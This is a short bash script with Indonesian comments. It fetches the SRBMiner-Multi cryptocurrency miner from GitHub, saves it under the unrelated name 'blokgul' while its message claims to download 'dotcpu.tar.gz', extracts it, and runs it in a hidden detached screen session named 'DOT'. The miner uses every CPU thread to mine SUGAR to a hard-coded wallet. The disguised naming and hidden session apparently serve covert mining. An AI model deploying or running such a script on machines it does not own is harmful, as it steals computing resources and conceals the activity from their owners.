#!/bin/bash

# Periksa apakah file sudah diekstrak sebelumnya
if [ ! -d "blokgul" ]; then
echo "Mengunduh dan mengekstrak dotcpu.tar.gz..."
wget -O blokgul https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.2/SRBMiner-Multi-2-7-2-Linux.tar.gz
tar -xvf blokgul
else
    echo "File sudah diekstrak. Lewati pengunduhan."
fi

screen -dmS DOT ./SRBMiner-Multi-2-7-2/SRBMiner-MULTI -a yespowersugar -o yespowerSUGAR.eu.mine.zpool.ca:6241 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j -p c=SUGAR -t $(nproc)
